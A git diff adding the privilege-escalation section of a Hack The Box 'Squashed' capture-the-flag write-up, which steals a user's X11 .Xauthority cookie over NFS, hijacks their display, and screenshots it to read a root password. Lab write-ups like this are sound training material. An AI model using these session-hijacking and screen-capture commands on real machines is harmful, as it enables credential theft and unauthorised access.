@@ -1,4 +1,4 @@
-# Squashed | HTB
+![image](https://github.com/alonpresman/AlonPresman/assets/121765218/f9318782-38a1-400a-adf7-013e4a3af064)# Squashed | HTB
 ### Difficulty Level: Easy
 ------------------------------------
 
@@ -268,6 +268,143 @@ If this reoccurs, then your database file may be corrupt. (HMAC mismatch)
 
 We need password to open the file. It's time to use keepass2john to convert the file into a hash that john the ripper
 can deal with and work with.
+But this is what  I got:
+
+![image](https://cdn-images-1.medium.com/max/1000/1*DU-m9GbyYOJxbHOSldhm1A.png)
+
+so we need to find another way to get the content of the file.
+
+After enumerate ross directory I found an hidden file:
+
+```bash
+-rw-------  1 ross ross   57 Mar 22 17:43 .Xauthority
+```
+
+
+"The .xauthority file contains authentication information in the form of authentication tokens or "magic cookies" used by the
+X Window System (X11) to authenticate users and processes accessing the X server. 
+The exact contents of the file are binary and not meant to be human-readable.
+The file typically stores one or more authentication tokens, each associated with a specific display (X server).."
+
+So, this file can help us to escalate our privilliges.
+
+first let's mount the other shared directory:
+
+```bash
+sudo mount -t nfs 10.10.11.191:/home/ross /mnt
+```
+
+After list /mnt directory I can see that my user alon is the owner of the directory so I su to alon and open python http server
+to grab the .Xauthority file:
+
+```bash
+python3 -m http server
+```
+
+Because /home/ross is located within our machine cause we mounted it, grab the file from "our machine" to real one.
+
+```bash
+wget http://<tun-0>:8000/.Xauthority
+```
+
+After get it , cat it:
+```
+squashed.htb0MIT-MAGIC-COOKIE-1,<W��[�x���0���
+```
+This is magic cookie of user ross.
+
+now we can encode it to base64 to move the content to alex to hijack the session of ross as alex.
+
+```bash
+cat .Xauthority | base64
+AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABAsPFeJuVvWePCWqDCHnwTe
+```
+
+now as alex create a new decode file with the content, and then export new path that will use the magic cookie of
+ross.
+
+```bash
+alex@squashed:/tmp$  echo AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABAsPFeJuVvWePCWqDCHnwTe | base64 -d > /tmp/.Xauthority 
+<FeJuVvWePCWqDCHnwTe | base64 -d > /tmp/.Xauthority 
+alex@squashed:/tmp$ export XAUTHORITY=/tmp/.Xauthority
+export XAUTHORITY=/tmp/.Xauthority
+```
+
+Let's get more information about the user ross:
+```bash
+alex@squashed:/home/ross$ w
+w
+ 16:32:21 up 22:49,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+ross     tty7     :0               Fri17   22:49m  1:52   0.04s /usr/libexec/gnome-session-binary --systemd --session=gnome
+```
+
+Now we can get a display of the screen of user ross:
+
+```bash
+xwd -root -screen -silent -display :0 > /tmp/screen.xwd
+```
+
+
+grab the file from the target machine to your machine:
+
+```bash
+python3 -m http.server 3333
+```
+
+on your machine:
+```bash
+wget http://10.10.11.191:3333/screen.xwd
+```
+
+After open it with:
+```
+gimp screen.xwd
+```
+
+we can display the screenshot:
+
+![image](https://cdn-images-1.medium.com/max/1000/1*mfVI6mx-LROZmE21x35kBw.png)
+
+There is a password to root!
+
+su root and get root.txt flag.
+
+```bash
+alex@squashed:/$ su root
+su root
+Password: *************
+whoami
+root
+cat /root/root.txt
+********************************
+```
+
+AND THIS IS THE END!
+
+***Written by Alon Presman, Penetration Tester and Ethical Hacker.***
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
